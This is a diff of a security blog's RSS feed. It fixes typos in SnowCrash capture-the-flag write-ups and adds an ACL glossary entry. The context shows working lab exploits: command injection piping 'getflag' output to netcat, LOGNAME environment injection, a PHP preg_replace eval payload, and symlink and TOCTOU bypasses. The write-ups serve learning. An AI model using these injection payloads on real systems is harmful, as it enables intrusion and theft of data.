@@ -6,8 +6,43 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
         <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
-        <lastBuildDate>Tue, 18 Aug 2020 11:24:50 +0200</lastBuildDate>
+        <lastBuildDate>Thu, 20 Aug 2020 12:04:27 +0200</lastBuildDate>
         <atom:link href="/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>ACL</title>
+            <link>/posts/glossary/acl/</link>
+            <pubDate>Thu, 20 Aug 2020 12:04:27 +0200</pubDate>
+            
+            <guid>/posts/glossary/acl/</guid>
+            <description>ACL for Access Control List is a list of permission. That list can specify whom have access to the file and the operations permitted on it.
+ACL can be retrieved using the command getfacl, here is the following output of that command:
+getfacl: Removing leading &amp;#39;/&amp;#39; from absolute path names # file: opt/openarenaserver # owner: root # group: root user::rwx user:level05:rwx user:flag05:rwx group::r-x mask::rwx other::r-x default:user::rwx default:user:level05:rwx default:user:flag05:rwx default:group::r-x default:mask::rwx default:other::r-x Source  Wikipedia  </description>
+            <content type="html"><![CDATA[<p>ACL for Access Control List is a list of permission.
+That list can specify whom have access to the file and the operations permitted on it.</p>
+<p>ACL can be retrieved using the command <code>getfacl</code>, here is the following output of that command:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">getfacl: Removing leading &#39;/&#39; from absolute path names
+# file: opt/openarenaserver
+# owner: root
+# group: root
+user::rwx
+user:level05:rwx
+user:flag05:rwx
+group::r-x
+mask::rwx
+other::r-x
+default:user::rwx
+default:user:level05:rwx
+default:user:flag05:rwx
+default:group::r-x
+default:mask::rwx
+default:other::r-x
+</code></pre></div><h2 id="source">Source</h2>
+<ul>
+<li><a href="https://en.wikipedia.org/wiki/Access-control_list">Wikipedia</a></li>
+</ul>
+]]></content>
+        </item>
         
         <item>
             <title>How to create a Minecraft server using Docker</title>
@@ -312,11 +347,11 @@ We can also select the version of that server.</p>
             <pubDate>Mon, 17 Aug 2020 14:23:18 +0200</pubDate>
             
             <guid>/posts/glossary/toctou/</guid>
-            <description>TOCTOU mean Time-of-Check to Time-of-Use. It&amp;rsquo;s a bug were it involve checking the state of the system and using the result
+            <description>TOCTOU mean Time-of-Check to Time-of-Use. It&amp;rsquo;s a bug where it involves checking the state of the system and using the result.
 Example if (access(&amp;#34;file&amp;#34;, W_OK) != 0) { exit(1); } fd = open(&amp;#34;file&amp;#34;, O_WRONLY); write(fd, buffer, sizeof(buffer)); Here an attacker can create a symlink after the access but before the open call, resulting in a malicious file to be open.
-Synonyms  TOCTTOU TOC/TOU  Source  wikipedia  </description>
-            <content type="html"><![CDATA[<p><strong>TOCTOU</strong> mean Time-of-Check to Time-of-Use. It&rsquo;s a bug were it involve <strong>checking</strong>
-the state of the system and <strong>using</strong> the result</p>
+Synonyms  TOCTTOU TOC/TOU  Source  Wikipedia  </description>
+            <content type="html"><![CDATA[<p><strong>TOCTOU</strong> mean Time-of-Check to Time-of-Use. It&rsquo;s a bug where it involves <strong>checking</strong>
+the state of the system and <strong>using</strong> the result.</p>
 <h2 id="example">Example</h2>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">if</span> (access(<span style="color:#e6db74">&#34;file&#34;</span>, W_OK) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
    exit(<span style="color:#ae81ff">1</span>);
@@ -333,7 +368,7 @@ resulting in a malicious <strong>file</strong> to be open.</p>
 </ul>
 <h2 id="source">Source</h2>
 <ul>
-<li><a href="https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use">wikipedia</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use">Wikipedia</a></li>
 </ul>
 ]]></content>
         </item>
@@ -344,11 +379,11 @@ resulting in a malicious <strong>file</strong> to be open.</p>
             <pubDate>Mon, 03 Aug 2020 18:26:16 +0200</pubDate>
             
             <guid>/posts/glossary/symlink/</guid>
-            <description>A symbolink link is a file that contains a reference to another file.
+            <description>A symbolic link is a file that contains a reference to another file.
 That reference take form as a path in its absolute or relative form.
 A symlink may contains a path that point to nothing
 Synonym  symlink soft link  </description>
-            <content type="html"><![CDATA[<p>A <strong>symbolink link</strong> is a file that contains a <em>reference</em> to another file.<br>
+            <content type="html"><![CDATA[<p>A <strong>symbolic link</strong> is a file that contains a <em>reference</em> to another file.<br>
 That <em>reference</em> take form as a path in its absolute or relative form.</p>
 <p>A <strong>symlink</strong> may contains a path that point to nothing</p>
 <h2 id="synonym">Synonym</h2>
@@ -532,10 +567,10 @@ We try to inspect <code>getflag</code>, the binary that give us the flag for all
 </code></pre></td></tr></table>
 </div>
 </div><p>We see that <code>getflag</code> is hardened against the use of debugger and the lib injection (line 28-46).<br>
-After that we here in a switch-case were the uid is used as index to retreive the correct flag for the user.</p>
+After that we here in a switch-case were the UID is used as index to retrieve the correct flag for the user.</p>
 <h2 id="the-solution">The Solution</h2>
 <p>Beside <code>getflag</code> as setup some protection from using a debugger,
-these protection are not strong enough.</p>
+but these protections are not strong enough.</p>
 <p>See the following execution.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ gdb -q getflag
 Reading symbols from /bin/getflag...<span style="color:#f92672">(</span>no debugging symbols found<span style="color:#f92672">)</span>...done.
@@ -556,10 +591,10 @@ $1 <span style="color:#f92672">=</span> 0x804c008 <span style="color:#e6db74">&#
             <pubDate>Mon, 03 Aug 2020 15:58:10 +0200</pubDate>
             
             <guid>/posts/snowcrash/level13/</guid>
-            <description>On our home dir, we have a binary level13.
+            <description>On our home DIR, we have a binary level13.
 By executing it, we see that he check if we have the correct UID for using it
 $ ./level13 UID 2013 started us but we we expect 4242 $ id uid=2013(level13) gid=2013(level13) groups=2013(level13),100(users) Pseudo Code #define UID 4242  void main(void) { uid_t uid; char *token; uid = getuid(); if (uid != UID) { printf(&amp;#34;UID %d started us but we we expect %d\n&amp;#34;, getuid(), UID); exit(1); } token = ft_des(&amp;#34;boe]!</description>
-            <content type="html"><![CDATA[<p>On our home dir, we have a binary <code>level13</code>.<br>
+            <content type="html"><![CDATA[<p>On our home DIR, we have a binary <code>level13</code>.<br>
 By executing it, we see that he check if we have the correct UID for using it</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./level13
 UID <span style="color:#ae81ff">2013</span> started us but we we expect <span style="color:#ae81ff">4242</span>
@@ -595,7 +630,7 @@ Starting program: /home/user/level13/level13
 Breakpoint 1, 0x0804858f in main <span style="color:#f92672">()</span>
 <span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> call <span style="color:#f92672">(</span>char*<span style="color:#f92672">)</span>ft_des<span style="color:#f92672">(</span>0x80486ef<span style="color:#f92672">)</span>
 $2 <span style="color:#f92672">=</span> 0x804b028 <span style="color:#e6db74">&#34;[ ... output omitted ... ]&#34;</span>
-</code></pre></div><p>But it exist some other solution, like:</p>
+</code></pre></div><p>But it exists some other solution, like:</p>
 <ul>
 <li>Injecting a handcrafted lib to overwrite <code>getuid()</code></li>
 <li>rewrite the binary to change the check of UID</li>
@@ -609,9 +644,9 @@ $2 <span style="color:#f92672">=</span> 0x804b028 <span style="color:#e6db74">&#
             <pubDate>Mon, 03 Aug 2020 15:57:10 +0200</pubDate>
             
             <guid>/posts/snowcrash/level12/</guid>
-            <description>On our home directory, we have access to a perl script.
+            <description>On our home directory, we have access to a Perl script.
 The script #!/usr/bin/env perl # localhost:4646 use CGI qw{param}; print &amp;#34;Content-type: text/html\n\n&amp;#34;; sub t { $nn = $_[1]; $xx = $_[0]; $xx =~ tr/a-z/A-Z/; $xx =~ s/\s.*//; @output = `egrep &amp;#34;^$xx&amp;#34; /tmp/xd 2&amp;gt;&amp;amp;1`; foreach $line (@output) { ($f, $s) = split(/:/, $line); if($s =~ $nn) { return 1; } } return 0; } sub n { if($_[0] == 1) { print(&amp;#34;.</description>
-            <content type="html"><![CDATA[<p>On our home directory, we have access to a perl script.</p>
+            <content type="html"><![CDATA[<p>On our home directory, we have access to a Perl script.</p>
 <h2 id="the-script">The script</h2>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-perl" data-lang="perl"><span style="color:#75715e">#!/usr/bin/env perl</span>
 <span style="color:#75715e"># localhost:4646</span>
@@ -680,7 +715,7 @@ n(t(param(<span style="color:#e6db74">&#34;x&#34;</span>), param(<span style="co
 </div>
 </div><p>The flaw is located on the function <code>t()</code> at the <strong>line 6</strong>,
 were a shell command is executed using the first parameter of <code>t()</code> alias <code>x</code>.</p>
-<p>The argument <code>xx</code> is some what sanitize, all letter become uppercase letter,
+<p>The argument <code>xx</code> is somewhat sanitized, all letter become uppercase letter,
 everything after the first <em>space</em> char is strip.</p>
 <h2 id="the-solution">The Solution</h2>
 <p>For the solution, I create a file <code>LVL10</code> (The uppercase name is important)
@@ -705,9 +740,9 @@ Check flag.Here is your token : <span style="color:#f92672">[</span> ... output 
             <pubDate>Mon, 03 Aug 2020 15:56:10 +0200</pubDate>
             
             <guid>/posts/snowcrash/level11/</guid>
-            <description>On connection we have access to a lua script that is already running.
-The server #!/usr/bin/env lua local socket = require(&amp;#34;socket&amp;#34;) local server = assert(socket.bind(&amp;#34;127.0.0.1&amp;#34;, 5151)) function hash(pass) prog = io.popen(&amp;#34;echo &amp;#34;..pass..&amp;#34; | sha1sum&amp;#34;, &amp;#34;r&amp;#34;) data = prog:read(&amp;#34;*all&amp;#34;) prog:close() data = string.sub(data, 1, 40) return data end while 1 do local client = server:accept() client:send(&amp;#34;Password: &amp;#34;) client:settimeout(60) local l, err = client:receive() if not err then print(&amp;#34;trying &amp;#34; .. l) local h = hash(l) if h ~= &amp;#34;f05d1d066fb246efe0c6f7d095f909a7a0cf34a0&amp;#34; then client:send(&amp;#34;Erf nope.</description>
-            <content type="html"><![CDATA[<p>On connection we have access to a lua script that is already running.</p>
+            <description>On connection, we have access to a LUA script that is already running and its content is located in level11.lua.
+The server #!/usr/bin/env lua local socket = require(&amp;#34;socket&amp;#34;) local server = assert(socket.bind(&amp;#34;127.0.0.1&amp;#34;, 5151)) function hash(pass) prog = io.popen(&amp;#34;echo &amp;#34;..pass..&amp;#34; | sha1sum&amp;#34;, &amp;#34;r&amp;#34;) data = prog:read(&amp;#34;*all&amp;#34;) prog:close() data = string.sub(data, 1, 40) return data end while 1 do local client = server:accept() client:send(&amp;#34;Password: &amp;#34;) client:settimeout(60) local l, err = client:receive() if not err then print(&amp;#34;trying &amp;#34; .</description>
+            <content type="html"><![CDATA[<p>On connection, we have access to a LUA script that is already running and its content is located in <code>level11.lua</code>.</p>
 <h2 id="the-server">The server</h2>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-lua" data-lang="lua"><span style="color:#75715e">#!/usr/bin/env lua</span>
 <span style="color:#66d9ef">local</span> socket <span style="color:#f92672">=</span> require(<span style="color:#e6db74">&#34;socket&#34;</span>)
@@ -743,7 +778,7 @@ The server #!/usr/bin/env lua local socket = require(&amp;#34;socket&amp;#34;) l
 
   client:close()
 <span style="color:#66d9ef">end</span>
-</code></pre></div><p>The script do the following:</p>
+</code></pre></div><p>The script does the following:</p>
 <ol>
 <li>Wait for client to connect from <code>localhost</code></li>
 <li>Receive a password from Client</li>
@@ -777,13 +812,13 @@ The server #!/usr/bin/env lua local socket = require(&amp;#34;socket&amp;#34;) l
 <span style="color:#66d9ef">end</span>
 </code></pre></td></tr></table>
 </div>
-</div><p>Here, his input <code>pass</code> is used in a shell command ( line 2 ) without sanitizing.
-Because of that flaw, we can execute abritary code.</p>
+</div><p>Here, his input <code>pass</code> is used in a shell command (line 2) without sanitizing.
+Because of that flaw, we can execute arbitrary code.</p>
 <h2 id="the-payload">The payload</h2>
 <p>For the payload, we have access to a lot of possibility.<br>
-Here is my solution, I execute <code>getflag</code> to retreive the flag and send the result using <code>netcat</code></p>
+Here is my solution, I execute <code>getflag</code> to retrieve the flag and send the result using <code>netcat</code>.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">; getflag | nc 127.0.0.1 <span style="color:#ae81ff">1234</span>
-</code></pre></div><p>before connecting to the service, we need to start the server that will listen for data on port <code>1234</code></p>
+</code></pre></div><p>Before connecting to the service, we need to start the server that will listen for data on port <code>1234</code></p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ nc -l <span style="color:#ae81ff">1234</span> &amp;
 <span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> <span style="color:#ae81ff">14921</span>
 $ echo <span style="color:#e6db74">&#34;; getflag | nc 127.0.0.1 1234&#34;</span> | nc 127.0.0.1 <span style="color:#ae81ff">5151</span>
@@ -800,13 +835,15 @@ Erf nope..
             
             <guid>/posts/snowcrash/level10/</guid>
             <description>On connection, we are greeted by the 2 following file.
-$ ls -l total 16 -rwsr-sr-x+ 1 flag10 level10 10817 Mar 5 2016 level10 -rw------- 1 flag10 flag10 26 Mar 5 2016 token Pseudo code 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49  int main(int argc, char **argv) { char *host; char *file; int socketfd; int fd; int rc; char buffer [4096]; sockaddr_in addr; if (argc &amp;lt; 3) { errx(1, &amp;#34;%s file host\n\tsends file to host if you have access to it\n&amp;#34;, argv[0]); } file = argv[1]; host = argv[2]; if (access(argv[1], R_OK) == 0) { printf(&amp;#34;Connecting to %s:6969 .</description>
+$ ls -l total 16 -rwsr-sr-x+ 1 flag10 level10 10817 Mar 5 2016 level10 -rw------- 1 flag10 flag10 26 Mar 5 2016 token Pseudo code The following Pseudo code is generated from level10
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49  int main(int argc, char **argv) { char *host; char *file; int socketfd; int fd; int rc; char buffer [4096]; sockaddr_in addr; if (argc &amp;lt; 3) { errx(1, &amp;#34;%s file host\n\tsends file to host if you have access to it\n&amp;#34;, argv[0]); } file = argv[1]; host = argv[2]; if (access(argv[1], R_OK) == 0) { printf(&amp;#34;Connecting to %s:6969 .</description>
             <content type="html"><![CDATA[<p>On connection, we are greeted by the 2 following file.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ls -l
 total <span style="color:#ae81ff">16</span>
 -rwsr-sr-x+ <span style="color:#ae81ff">1</span> flag10 level10 <span style="color:#ae81ff">10817</span> Mar  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2016</span> level10
 -rw-------  <span style="color:#ae81ff">1</span> flag10 flag10     <span style="color:#ae81ff">26</span> Mar  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2016</span> token
 </code></pre></div><h2 id="pseudo-code">Pseudo code</h2>
+<p>The following Pseudo code is generated from <code>level10</code></p>
 <div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
@@ -920,7 +957,7 @@ total <span style="color:#ae81ff">16</span>
 <li>Write the banner on the host</li>
 </ol>
 </li>
-<li>Open the file in readonly</li>
+<li>Open the file in read only</li>
 <li>Read the file</li>
 <li>Write the content of file to host</li>
 </ol>
@@ -934,7 +971,7 @@ the file given as argument is checked with <code>access</code> then the file is 
 <li>start <code>level10</code></li>
 <li>when <code>level10</code> try to connect to the server
 <ol>
-<li>replace the readable file with <strong>token</strong> file using a sumlink</li>
+<li>replace the readable file with <strong>token</strong> file using a symlink</li>
 <li>accept the connection of <code>level10</code></li>
 </ol>
 </li>
@@ -1093,13 +1130,13 @@ INFO:root:done
             <pubDate>Mon, 03 Aug 2020 15:54:09 +0200</pubDate>
             
             <guid>/posts/snowcrash/level09/</guid>
-            <description>on connection, we have 2 file level09 and token
-first token is readable but it contain some non-printable char,
+            <description>On connection, we have 2 files level09 and token.
+First token is readable but it contains some non-printable char,
 $ cat f4kmm6p|=�p�n��DB�Du{�� $ xxd token 0000000: 6634 6b6d 6d36 707c 3d82 7f70 826e 8382 f4kmm6p|=..p.n.. 0000010: 4442 8344 757b 7f8c 890a DB.Du{.... on the other hand, level09 require an argument.
-$ ./level09 You need to provied only one arg. The argument is transformed into another string
+$ ./level09 You need to provied only one arg. The argument is transformed into another string.
 $ ./level09 aaaaa abcde $ .</description>
-            <content type="html"><![CDATA[<p>on connection, we have 2 file <code>level09</code> and <code>token</code></p>
-<p>first <code>token</code> is readable but it contain some non-printable char,</p>
+            <content type="html"><![CDATA[<p>On connection, we have 2 files <code>level09</code> and <code>token</code>.</p>
+<p>First <code>token</code> is readable but it contains some non-printable char,</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ cat
 f4kmm6p|<span style="color:#f92672">=</span>�p�n��DB�Du<span style="color:#f92672">{</span>��
 $ xxd token
@@ -1108,7 +1145,7 @@ $ xxd token
 </code></pre></div><p>on the other hand, <code>level09</code> require an argument.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./level09
 You need to provied only one arg.
-</code></pre></div><p>The argument is transformed into another string</p>
+</code></pre></div><p>The argument is transformed into another string.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./level09 aaaaa
 abcde
 $ ./level09 <span style="color:#66d9ef">$(</span>python -c <span style="color:#e6db74">&#39;print(&#34;a&#34;*26)&#39;</span><span style="color:#66d9ef">)</span>
@@ -1116,7 +1153,7 @@ abcdefghijklmnopqrstuvwxyz
 $ ./level09 <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>python -c <span style="color:#e6db74">&#39;print(&#34;hello\x05world&#34;)&#39;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
 hfnos
 <span style="color:#f92672">}</span>vzun
-</code></pre></div><p>with the following output we can determine how <code>level09</code> work.<br>
+</code></pre></div><p>With the following output we can determine how <code>level09</code> work.<br>
 <code>level09</code> transform our argument by adding to any char its index value in the string.</p>
 <h2 id="game-breaker">Game breaker</h2>
 <p>To decode <code>token</code>, we need to write a script who does the opposite of <code>level09</code>.</p>
@@ -1147,14 +1184,17 @@ abcdef
             <pubDate>Mon, 03 Aug 2020 15:53:09 +0200</pubDate>
             
             <guid>/posts/snowcrash/level08/</guid>
-            <description>On the home dir, we have 2 file level08 with is following pseudo-code and token who is only readable be flag08
-$ ls -l total 16 -rwsr-s---+ 1 flag08 level08 8617 Mar 5 2016 level08 -rw------- 1 flag08 flag08 26 Mar 5 2016 token int main(int argc,char **argv) { char *needle; int fd; ssize_t n; char buf[1024]; if (argc == 1) { errx(1, &amp;#34;%s [file to read]\n&amp;#34;, argv[0]); } needle = strstr(argv[1], &amp;#34;token&amp;#34;); if (needle !</description>
-            <content type="html"><![CDATA[<p>On the home dir, we have 2 file <code>level08</code> with is following pseudo-code and <code>token</code> who is only readable be <strong>flag08</strong></p>
+            <description>On the home DIR, we have 2 files level08 with is following pseudo-code and token who is only readable be flag08.
+$ ls -l total 16 -rwsr-s---+ 1 flag08 level08 8617 Mar 5 2016 level08 -rw------- 1 flag08 flag08 26 Mar 5 2016 token The Pseudo Code Here is the pseudo code for the file level08:
+int main(int argc,char **argv) { char *needle; int fd; ssize_t n; char buf[1024]; if (argc == 1) { errx(1, &amp;#34;%s [file to read]\n&amp;#34;, argv[0]); } needle = strstr(argv[1], &amp;#34;token&amp;#34;); if (needle !</description>
+            <content type="html"><![CDATA[<p>On the home DIR, we have 2 files <code>level08</code> with is following pseudo-code and <code>token</code> who is only readable be <strong>flag08</strong>.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ls -l
 total <span style="color:#ae81ff">16</span>
 -rwsr-s---+ <span style="color:#ae81ff">1</span> flag08 level08 <span style="color:#ae81ff">8617</span> Mar  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2016</span> level08
 -rw-------  <span style="color:#ae81ff">1</span> flag08 flag08    <span style="color:#ae81ff">26</span> Mar  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2016</span> token
-</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc,<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
+</code></pre></div><h2 id="the-pseudo-code">The Pseudo Code</h2>
+<p>Here is the pseudo code for the file <code>level08</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc,<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv)
 {
   <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>needle;
   <span style="color:#66d9ef">int</span> fd;
@@ -1180,11 +1220,11 @@ total <span style="color:#ae81ff">16</span>
 }
 </code></pre></div><h2 id="explanation">Explanation</h2>
 <p><code>level08</code> take a file as argument<br>
-check if the argument doesn&rsquo;t contains the string <code>token</code><br>
-then open/read the file</p>
+check if the argument doesn&rsquo;t contain the string <code>token</code><br>
+then open/read the file.</p>
 <h2 id="counter-the-filename-check">Counter the filename check</h2>
-<p>to counter the filename check on <code>level08</code> we have access in linux to <a href="/posts/glossary/symlink">symbolic link</a>.<br>
-We just have to create a link to the file <code>~/token</code> with a name that doesn&rsquo;t not contains the string <code>token</code></p>
+<p>To counter the filename check on <code>level08</code> we have access in Linux to <a href="/posts/glossary/symlink">symbolic link</a>.<br>
+We just have to create a link to the file <code>~/token</code> with a name that doesn&rsquo;t contain the string <code>token</code></p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ln -s ~/token /tmp/foo
 $ ./level08 /tmp/foo
 <span style="color:#f92672">[</span> ... output omitted ... <span style="color:#f92672">]</span>
@@ -1198,9 +1238,9 @@ $ ./level08 /tmp/foo
             
             <guid>/posts/snowcrash/level07/</guid>
             <description>On the home directory, we have a file level07 with the following pseudo-code
-int main() { char *cmd; asprintf(&amp;amp;cmd, &amp;#34;/bin/echo %s &amp;#34;, getenv(&amp;#34;LOGNAME&amp;#34;)) return system(cmd); } Explenation level07 retrieve the value LOGNAME from the env table,
-then concat the string at the end of /bin/echo  and execute it
- Simple execution $ ./level07 level07  Changing the output $ LOGNAME=foobar ./level07 foobar   Poisoning the env table  system(char *command) executes a command specified in command by calling /bin/sh -c command</description>
+int main() { char *cmd; asprintf(&amp;amp;cmd, &amp;#34;/bin/echo %s &amp;#34;, getenv(&amp;#34;LOGNAME&amp;#34;)) return system(cmd); } Explanation level07 retrieve the value LOGNAME from the env table,
+then join the string at the end of /bin/echo and execute it
+ Simple execution $ ./level07 level07  Changing the output $ LOGNAME=foobar ./level07 foobar   Poisoning the Env table  system(char *command) executes a command specified in command by calling /bin/sh -c command</description>
             <content type="html"><![CDATA[<p>On the home directory, we have a file <code>level07</code> with the following pseudo-code</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
   <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>cmd;
@@ -1208,9 +1248,9 @@ then concat the string at the end of /bin/echo  and execute it
   asprintf(<span style="color:#f92672">&amp;</span>cmd, <span style="color:#e6db74">&#34;/bin/echo %s &#34;</span>, getenv(<span style="color:#e6db74">&#34;LOGNAME&#34;</span>))
   <span style="color:#66d9ef">return</span> system(cmd);
 }
-</code></pre></div><h2 id="explenation">Explenation</h2>
+</code></pre></div><h2 id="explanation">Explanation</h2>
 <p><code>level07</code> retrieve the value <strong>LOGNAME</strong> from the <a href="/posts/glossary/env_table">env table</a>,<br>
-then concat the string at the end of <code>/bin/echo </code> and execute it</p>
+then join the string at the end of <code>/bin/echo</code> and execute it</p>
 <ul>
 <li>Simple execution
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ ./level07
@@ -1221,12 +1261,12 @@ level07
 foobar
 </code></pre></div></li>
 </ul>
-<h2 id="poisoning-the-env-table">Poisoning the env table</h2>
+<h2 id="poisoning-the-env-table">Poisoning the Env table</h2>
 <blockquote>
 <p><code>system(char *command)</code> executes a command specified in <em>command</em> by calling
 <strong>/bin/sh</strong> -c <em>command</em></p>
 </blockquote>
-<p>Because <strong>LOGNAME</strong> is not sanytize, we can execute any command as <strong>flag07</strong></p>
+<p>Because <strong>LOGNAME</strong> is not sanitized, we can execute any command as <strong>flag07</strong></p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ LOGNAME<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;$(whoami)&#39;</span> ./level07
 flag07
 </code></pre></div>]]></content>
@@ -1290,12 +1330,12 @@ $r <span style="color:#f92672">=</span> <span style="color:#a6e22e">x</span>($ar
 <p>On the script, only the function <strong>x</strong> is interesting because of the <code>preg_replace</code> with the <strong>eval flag</strong> (<code>\e</code>) on (line 11).</p>
 <p>The <strong>eval flag</strong> on <code>preg_replace</code> &hellip;</p>
 <blockquote>
-<p>does normal substitution of backreferences in the replacement string, evaluates it as PHP code, and uses the result for replacing the search string</p>
+<p>Does normal substitution of backreferences in the replacement string, evaluates it as PHP code, and uses the result for replacing the search string.</p>
 </blockquote>
 <h2 id="malicious-file">Malicious file</h2>
 <p>For the exploit to work, our payload need to be matched in the 2nd group of the regex pattern <code>/(\[x (.*)\])/e</code></p>
 <p>I came with the following result</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">[x ${`echo current user $(id) 1&gt;&amp;2`}]
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">[x ${`echo current user $(id) 1&gt;&amp;2`}]
 </code></pre></div><p>and get as output</p>
 <div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
@@ -1314,10 +1354,10 @@ $r <span style="color:#f92672">=</span> <span style="color:#a6e22e">x</span>($ar
 </div><p>See the output of our command on line 2</p>
 <h2 id="source">Source</h2>
 <ul>
-<li><a href="https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.simple">php string variable parsing</a></li>
-<li><a href="https://www.php.net/manual/en/function.preg-replace.php">preg replace</a></li>
-<li><a href="https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers.eval">preg replace eval</a></li>
-<li><a href="http://www.madirish.net/402">exploiting php pcre func</a></li>
+<li><a href="https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.simple">PHP string variable parsing</a></li>
+<li><a href="https://www.php.net/manual/en/function.preg-replace.php">Preg replace</a></li>
+<li><a href="https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers.eval">Preg replace eval</a></li>
+<li><a href="http://www.madirish.net/402">exploiting PHP PCRE function</a></li>
 </ul>
 ]]></content>
         </item>
@@ -1328,16 +1368,16 @@ $r <span style="color:#f92672">=</span> <span style="color:#a6e22e">x</span>($ar
             <pubDate>Mon, 03 Aug 2020 14:35:25 +0200</pubDate>
             
             <guid>/posts/snowcrash/level05/</guid>
-            <description>When connecting to level05, we are greated be the following line
